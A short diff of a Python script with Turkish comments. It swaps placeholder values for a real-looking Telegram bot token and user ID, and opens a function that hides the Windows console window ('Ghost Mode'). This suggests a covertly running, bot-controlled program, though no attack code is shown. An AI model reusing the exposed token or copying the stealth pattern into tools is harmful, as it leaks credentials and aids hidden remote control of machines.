@@ -13,8 +13,8 @@ except ImportError:
     HAS_GUI = False
 
 # --- ÖZEL YAPILANDIRMA ---
-TOKEN = "BURAYA_TELEGRAM_BOT_TOKENINI_YAZ"
-AUTHORIZED_USER_ID = 123456789  # Kendi Telegram User ID'ni buraya yaz (Güvenlik kilidi)
+TOKEN = "8933706623:AAF-UGKiWryqr4RNXhlY-2s6mpNtvI5W2qU"
+AUTHORIZED_USER_ID = 8201682688  # Kendi Telegram User ID'ni buraya yaz (Güvenlik kilidi)
 
 def hide_console():
     """Windows'ta siyah CMD penceresini tamamen gizler (Tam Hayalet Modu)"""
